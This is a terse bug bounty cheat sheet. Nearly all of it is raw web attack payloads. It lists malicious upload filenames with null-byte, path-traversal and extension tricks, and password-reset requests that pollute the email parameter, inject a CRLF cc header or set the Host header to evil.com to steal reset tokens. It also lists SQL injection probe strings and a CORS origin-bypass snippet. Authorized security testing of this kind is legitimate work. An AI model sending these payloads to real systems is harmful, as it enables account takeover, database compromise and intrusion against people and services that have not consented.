# Bug Bounty Tips
---

## File Upload

`.htaccess`

`file.svg`

`file.SVg`

`file.png.svg`

`file.php%00.png`

`file.png' or '1'='1`

`../../file.png`

`file.'svg`

## Password Reset

```
POST /reset  
email=victim@tld.xyz&email=hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz&token=$BF$
```

```
POST /reset  
email=victim@tld.xyz&token=
```

```
POST /reset  
email=victim@tld.xyz&token=0000000
```

```
POST /reset  
email=victim@tld.xyz&token=nul
```

```
POST /reset  
email=victim@tld.xyz&token=nil
```

```
POST /reset  
email=victim@tld.xyz&token=HACKER-TOKEN
```

```
POST /reset  
email=victim@tld.xyz%0a%0dcc:hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz,hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz%20hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz|hacker@tld.xyz
```

```
POST /reset  
email=victim
```

```
POST /reset  
email=victim@tld
```

```
POST /reset  
Host: evil.com
```

```
POST /reset
{"email":["victim@tld.xyz","hacker@tld.xyz"]}
```

**Check body response for password token**

**Token generation: timestamp? userid? useremail? random?**

## SQL Injection

`/?q=1`

`/?q=1'`

`/?q=1"`

`/?q=[1]`

`/?q[]=1`

```/?q=1` ```

`/?q=1\`

`/?q=1/*'*/`

`/?q=1/*!1111'*/`

`/?q=1'||'asd'||'`

`/?q=1' or '1'='1`

`/?q=1 or 1=1`

`/?q='or''='`

## CORS

```python
if isBlocked("evil.com"):
  try("target.network")
  try("target.computer")
```
